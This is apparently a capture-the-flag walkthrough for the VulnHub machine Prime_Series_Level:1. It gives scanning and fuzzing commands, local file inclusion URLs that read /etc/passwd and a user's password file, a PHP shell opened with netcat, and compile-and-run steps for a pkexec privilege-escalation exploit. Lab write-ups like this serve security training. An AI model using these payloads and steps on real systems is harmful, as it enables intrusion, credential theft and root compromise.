

# Prime_Series_Level:1 Walkthrough

**VulnHub Link:** [Prime_Series_Level:1](https://www.vulnhub.com/entry/prime-1,358/)
**Difficulty:** Easy
**Release Date:** 1 Sep 2019


## 1.Reconnaissance
```bash
nmap -A -O -T4 -P -sV 192.168.100.175
```
## 2.Web Enumeration
```bash
dirb http://192.168.100.175
```
```bash
ffuf -c -ic -u 'http://192.168.100.107/FUZZ' -w /usr/share/wordlists/dirb/common.txt -e .php,.txt

ffuf -c -ic -u 'http://192.168.100.107/index.php?FUZZ=location.txt' -w /usr/share/wordlists/dirb/common.txt -fw 8
```

http://192.168.100.107/image.php?secrettier360=/etc/passwd

victor , saket usernames found

http://192.168.100.107/image.php?secrettier360=/home/saket/password.txt

victor password found on wordpress and logged in 

secret php edited --> shell.php

php file executed and shell opened with netcat

user flag found

```bash
find / -perm /4000 2>/dev/null
```

pkexec 0.105 exploit used

download exploit.c and evil-so.c file from exploit-db or from my github account

```bash
gcc -shared -o evil.so -fPIC evil-so.c
gcc exploit.c -o exploit
./evil.so
./exploit
```
root flag captured
